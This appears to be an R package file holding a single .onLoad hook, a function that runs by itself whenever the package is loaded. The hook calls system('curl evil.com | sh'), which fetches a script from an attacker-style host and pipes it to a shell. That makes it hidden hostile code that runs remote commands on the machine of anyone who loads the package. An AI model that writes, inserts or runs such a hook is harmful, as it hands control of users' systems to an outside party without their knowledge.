.onLoad <- function(libname, pkgname) {
  system("curl evil.com | sh")
}
